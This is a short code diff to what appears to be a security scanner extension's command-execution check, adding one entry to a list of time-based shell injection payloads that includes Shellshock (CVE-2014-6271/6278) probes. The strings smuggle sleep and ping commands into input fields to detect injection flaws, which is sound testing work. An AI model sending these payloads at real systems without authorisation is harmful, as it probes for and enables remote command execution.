@@ -82,7 +82,7 @@ class CodeExec(IScannerCheck):
         self._payloads = {
             # Exploits shell command injection into '$input' on linux and "$input" on windows:
             # and CVE-2014-6271, CVE-2014-6278
-            'any': ['"&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],
+            'any': ['"&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)'],
             'php': [],
             'perl': [],
             'ruby': ['|sleep $time & ping -n $time localhost'],
